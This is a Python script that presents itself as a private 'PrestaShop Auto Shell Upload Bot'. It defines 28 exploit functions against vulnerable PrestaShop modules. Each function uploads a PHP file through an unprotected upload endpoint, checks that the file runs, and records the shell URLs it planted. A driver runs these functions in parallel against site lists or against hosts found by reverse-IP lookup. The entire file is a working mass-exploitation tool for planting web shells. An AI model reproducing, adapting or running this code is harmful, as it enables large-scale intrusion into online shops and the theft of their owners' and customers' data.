from multiprocessing.dummy import Pool
import sys, os

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
	
class spe:
	g = '\033[1;32m'
	r = '\033[31m'
	e = '\033[0m'
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	
	
#######################################
#                                     #
#         PrestaShop Exploits         #
#                                     #
#######################################



#####     blocktestimonial     #####



def blocktestimonial(url):
	try:
		posturl = url + "/modules/blocktestimonial/addtestimonial.php"
		post = {'testimonial_submitter_name':'NinjaCR3','testimonial_title':'Hello','testimonial_main_message':'Hello','testimonial':'Submit Testimonial'}
		files = {'testimonial_img':open("files/ups.php","rb")}
		requests.post(posturl,data=post,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/upload/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => blocktestimonial" + spe.r + "            ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => blocktestimonial" + spe.r + "            ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => blocktestimonial" + spe.r + "            ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     columnadverts     #####



def columnadverts(url):
	try:
		posturl = url + "/modules/columnadverts/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/columnadverts/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => columnadverts" + spe.r + "               ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => columnadverts" + spe.r + "               ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => columnadverts" + spe.r + "               ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     soopamobile     #####



def soopamobile(url):
	try:
		posturl = url + "/modules/soopamobile/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/soopamobile/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => soopamobile" + spe.r + "                 ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => soopamobile" + spe.r + "                 ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => soopamobile" + spe.r + "                 ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     soopabanners     #####



def soopabanners(url):
	try:
		posturl = url + "/modules/soopabanners/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/soopabanners/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => soopabanners" + spe.r + "                ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => soopabanners" + spe.r + "                ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => soopabanners" + spe.r + "                ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     vtermslideshow     #####



def vtermslideshow(url):
	try:
		posturl = url + "/modules/vtermslideshow/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/vtermslideshow/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => vtermslideshow" + spe.r + "              ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => vtermslideshow" + spe.r + "              ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => vtermslideshow" + spe.r + "              ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     simpleslideshow     #####



def simpleslideshow(url):
	try:
		posturl = url + "/modules/simpleslideshow/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/simpleslideshow/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => simpleslideshow" + spe.r + "             ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => simpleslideshow" + spe.r + "             ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => simpleslideshow" + spe.r + "             ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     productpageadverts     #####



def productpageadverts(url):
	try:
		posturl = url + "/modules/productpageadverts/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/productpageadverts/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => productpageadverts" + spe.r + "          ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => productpageadverts" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => productpageadverts" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     homepageadvertise     #####



def homepageadvertise(url):
	try:
		posturl = url + "/modules/homepageadvertise/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/homepageadvertise/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => homepageadvertise" + spe.r + "           ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => homepageadvertise" + spe.r + "           ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => homepageadvertise" + spe.r + "           ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     homepageadvertise2     #####



def homepageadvertise2(url):
	try:
		posturl = url + "/modules/homepageadvertise2/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/homepageadvertise2/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => homepageadvertise2" + spe.r + "          ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => homepageadvertise2" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => homepageadvertise2" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     jro_homepageadvertise     #####



def jro_homepageadvertise(url):
	try:
		posturl = url + "/modules/jro_homepageadvertise/uploadimage.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/jro_homepageadvertise/slides/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => jro_homepageadvertise" + spe.r + "       ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => jro_homepageadvertise" + spe.r + "       ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => jro_homepageadvertise" + spe.r + "       ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     attributewizardpro     #####



def attributewizardpro(url):
	try:
		posturl = url + "/modules/attributewizardpro/file_upload.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/attributewizardpro/file_uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => attributewizardpro" + spe.r + "          ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => attributewizardpro" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => attributewizardpro" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     1attributewizardpro     #####



def oneattributewizardpro(url):
	try:
		posturl = url + "/modules/1attributewizardpro/file_upload.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/1attributewizardpro/file_uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => 1attributewizardpro" + spe.r + "         ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => 1attributewizardpro" + spe.r + "         ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => 1attributewizardpro" + spe.r + "         ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     attributewizardpro.OLD     #####



def attributewizardproold(url):
	try:
		posturl = url + "/modules/attributewizardpro.OLD/file_upload.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/attributewizardpro.OLD/file_uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => attributewizardpro.OLD" + spe.r + "      ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => attributewizardpro.OLD" + spe.r + "      ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => attributewizardpro.OLD" + spe.r + "      ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     attributewizardpro_x     #####



def attributewizardpro_x(url):
	try:
		posturl = url + "/modules/attributewizardpro_x/file_upload.php"
		files = {'userfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/attributewizardpro_x/file_uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => attributewizardpro_x" + spe.r + "        ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => attributewizardpro_x" + spe.r + "        ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => attributewizardpro_x" + spe.r + "        ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     advancedslider     #####



def advancedslider(url):
	try:
		posturl = url + "/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php"
		files = {'qqfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/advancedslider/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => advancedslider" + spe.r + "              ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => advancedslider" + spe.r + "              ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => advancedslider" + spe.r + "              ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     cartabandonmentpro     #####



def cartabandonmentpro(url):
	try:
		posturl = url + "/modules/cartabandonmentpro/upload.php"
		files = {'image':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/cartabandonmentpro/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => cartabandonmentpro" + spe.r + "          ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => cartabandonmentpro" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => cartabandonmentpro" + spe.r + "          ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     cartabandonmentproOld     #####



def cartabandonmentproold(url):
	try:
		posturl = url + "/modules/cartabandonmentproOld/upload.php"
		files = {'image':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/cartabandonmentproOld/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => cartabandonmentproOld" + spe.r + "       ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => cartabandonmentproOld" + spe.r + "       ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => cartabandonmentproOld" + spe.r + "       ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     videostab     #####



def videostab(url):
	try:
		posturl = url + "/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload"
		files = {'qqfile':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/videostab/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => videostab" + spe.r + "                   ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => videostab" + spe.r + "                   ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => videostab" + spe.r + "                   ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     wg24themeadministration     #####



def wg24themeadministration(url):
	try:
		posturl = url + "/modules/wg24themeadministration/wg24_ajax.php"
		files = {'bajatax':open("files/ups.php","rb")}
		post = {'data':'bajatax','type':'pattern_upload'}
		requests.post(posturl,files=files,data=post,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/wg24themeadministration/img/upload/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => wg24themeadministration" + spe.r + "     ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => wg24themeadministration" + spe.r + "     ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => wg24themeadministration" + spe.r + "     ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     fieldvmegamenu     #####



def fieldvmegamenu(url):
	try:
		posturl = url + "/modules/fieldvmegamenu/ajax/upload.php"
		files = {'images[]':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/fieldvmegamenu/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => fieldvmegamenu" + spe.r + "              ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => fieldvmegamenu" + spe.r + "              ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => fieldvmegamenu" + spe.r + "              ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     wdoptionpanel     #####



def wdoptionpanel(url):
	try:
		posturl = url + "/modules/wdoptionpanel/wdoptionpanel_ajax.php"
		files = {'bajatax':open("files/ups.php","rb")}
		post = {'data':'bajatax','type':'image_upload'}
		requests.post(posturl,files=files,data=post,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/wdoptionpanel/upload/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => wdoptionpanel" + spe.r + "               ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => wdoptionpanel" + spe.r + "               ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => wdoptionpanel" + spe.r + "               ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     pk_flexmenu     #####



def pk_flexmenu(url):
	try:
		posturl = url + "/modules/pk_flexmenu/ajax/upload.php"
		files = {'images[]':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/pk_flexmenu/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => pk_flexmenu" + spe.r + "                 ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => pk_flexmenu" + spe.r + "                 ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => pk_flexmenu" + spe.r + "                 ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     pk_vertflexmenu     #####



def pk_vertflexmenu(url):
	try:
		posturl = url + "/modules/pk_vertflexmenu/ajax/upload.php"
		files = {'images[]':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/pk_vertflexmenu/uploads/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => pk_vertflexmenu" + spe.r + "             ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => pk_vertflexmenu" + spe.r + "             ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => pk_vertflexmenu" + spe.r + "             ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     nvn_export_orders     #####



def nvn_export_orders(url):
	try:
		posturl = url + "/modules/nvn_export_orders/upload.php"
		files = {'images[]':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/nvn_export_orders/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => nvn_export_orders" + spe.r + "           ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => nvn_export_orders" + spe.r + "           ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => nvn_export_orders" + spe.r + "           ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     megamenu     #####



def megamenu(url):
	try:
		posturl = url + "/modules/megamenu/uploadify/uploadify.php?id=pwn"
		files = {'Filedata':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => megamenu" + spe.r + "                    ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => megamenu" + spe.r + "                    ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => megamenu" + spe.r + "                    ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     tdpsthemeoptionpanel     #####



def tdpsthemeoptionpanel(url):
	try:
		posturl = url + "/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php"
		files = {'image_upload':open("files/ups.php","rb")}
		post = {'data':'bajatax'}
		requests.post(posturl,files=files,data=post,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/tdpsthemeoptionpanel/upload/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => tdpsthemeoptionpanel" + spe.r + "        ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => tdpsthemeoptionpanel" + spe.r + "        ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => tdpsthemeoptionpanel" + spe.r + "        ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     psmodthemeoptionpanel     #####



def psmodthemeoptionpanel(url):
	try:
		posturl = url + "/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php"
		files = {'image_upload':open("files/ups.php","rb")}
		post = {'data':'bajatax'}
		requests.post(posturl,files=files,data=post,headers=spe.headers,timeout=20)
		kontrolurl = url + "/modules/psmodthemeoptionpanel/upload/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => psmodthemeoptionpanel" + spe.r + "       ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => psmodthemeoptionpanel" + spe.r + "       ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => psmodthemeoptionpanel" + spe.r + "       ==>     " + spe.r + url + "  [ NOT VULN ]")



#####     masseditproduct     #####



def masseditproduct(url):
	try:
		posturl = url + "/modules/lib/redactor/file_upload.php"
		files = {'file':open("files/ups.php","rb")}
		requests.post(posturl,files=files,headers=spe.headers,timeout=20)
		kontrolurl = url + "/masseditproduct/uploads/file/ups.php"
		kontrol = requests.get(kontrolurl,headers=spe.headers,timeout=20)
		if "presta0day" in kontrol.text:
			print(spe.g + "[PrestaShop] => masseditproduct" + spe.r + "             ==>     " + spe.g + url + "  [ VULN ]")
			with open("results/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
			print(spe.r + "[PrestaShop] => masseditproduct" + spe.r + "             ==>     " + spe.r + url + "  [ NOT VULN ]")
	except:
		print(spe.r + "[PrestaShop] => masseditproduct" + spe.r + "             ==>     " + spe.r + url + "  [ NOT VULN ]")







	
def Exploit(url):
	try:
		if "http" in url:
			pass
		else:
			url = "http://" + url
		kontrol = requests.get(url,headers=spe.headers,timeout=20)
		if "prestashop" in kontrol.text or "PrestaShop" in kontrol.text:
			blocktestimonial(url)
			columnadverts(url)
			soopamobile(url)
			soopabanners(url)
			vtermslideshow(url)
			simpleslideshow(url)
			productpageadverts(url)
			homepageadvertise(url)
			homepageadvertise2(url)
			jro_homepageadvertise(url)
			attributewizardpro(url)
			oneattributewizardpro(url)
			attributewizardproold(url)
			attributewizardpro_x(url)
			advancedslider(url)
			cartabandonmentpro(url)
			cartabandonmentproold(url)
			videostab(url)
			wg24themeadministration(url)
			fieldvmegamenu(url)
			wdoptionpanel(url)
			pk_flexmenu(url)
			pk_vertflexmenu(url)
			nvn_export_orders(url)
			megamenu(url)
			tdpsthemeoptionpanel(url)
			psmodthemeoptionpanel(url)
			masseditproduct(url)
		else:
			print(spe.r + "[PrestaShop] => Not PrestaShop" + spe.r + "              ==>     " + spe.r + url)
	except:
		print(spe.r + "[PrestaShop] => Not PrestaShop" + spe.r + "              ==>     " + spe.r + url)










def fromlist():
	sitelist = input(spe.g + "[" + spe.r + "*" + spe.g + "] Sitelist : ")
	if sitelist == "":
		print("[" + spe.r + "!" + spe.g + "] Put Sitelist!")
		fromlist()
	else:
		try:
			sites = open(sitelist,"r").read().splitlines()
			try:
				pp = Pool(100)
				pr = pp.map(Exploit,sites)
			except:
				pass
		except:
			print(spe.g + "[" + spe.r + "-" + spe.g + "] Sitelist not found!" + spe.e)
			sys.exit()
	





	
def ipreverse():
	ip = input(spe.g + "[" + spe.r + "*" + spe.g + "] Target IP : ")
	if ip == "":
		print("[" + spe.r + "!" + spe.g + "] Put Target IP!")
		ipreverse()
	else:
		try:
			r = requests.get("http://api.hackertarget.com/reverseiplookup/?q=" + ip)
			if "error check your search parameter" in r.text or "No DNS A records" in r.text:
				sys.exit()
			else:
				with open("checkedsites.txt","a") as f:
					f.write(r.text)
				sites = open("checkedsites.txt","r").read().splitlines()
				if os.name == "nt":
					os.system("del checkedsites.txt")
				else:
					os.system("rm -rf checkedsites.txt")
				try:
					pp = Pool(100)
					pr = pp.map(Exploit,sites)
				except:
					pass
		except:
			print(spe.g + "[" + spe.r + "-" + spe.g + "] Error! May be target IP is wrong or not sites have in target IP!" + spe.e)
			sys.exit()
	
	
	
	
	
	
print(spe.g + """
======================================================
                     _         ___      _             
                    | |       / _ \    | |            
 _ __  _ __ ___  ___| |_ __ _| | | | __| | __ _ _   _ 
| '_ \| '__/ _ \/ __| __/ _` | | | |/ _` |/ _` | | | |
| |_) | | |  __/\__ \ || (_| | |_| | (_| | (_| | |_| |
| .__/|_|  \___||___/\__\__,_|\___/ \__,_|\__,_|\__, |
| |                                              __/ |
|_|                                             |___/ 
 
======================================================
 
[""" + spe.r + "#" + spe.g + """] presta0day Priv8 Bot
[""" + spe.r + "#" + spe.g + """] PrestaShop Auto Shell Upload Bot
[""" + spe.r + "#" + spe.g + """] Fast Speed ~ 2019 Priv8
[""" + spe.r + "#" + spe.g + """] Coded by NinjaCR3""")

try:
	import requests
except:
	print("\n" + spe.r + "[" + spe.g + "-" + spe.r + "] Requests module not installed! Please install requests module and run script again!" + spe.e)
	sys.exit()

print("""
Choose tool:
 
[1] From list
[2] IP Reverse and Scan
""")

try:
	os.mkdir("results")
except:
	pass

tool = input("[" + spe.r + "*" + spe.g + "] Choice  ==>  ")

if tool == "1":
	fromlist()
elif tool == "2":
	ipreverse()
else:
	print(spe.g + "[" + spe.r + "-" + spe.g + "] Wrong choice!" + spe.e)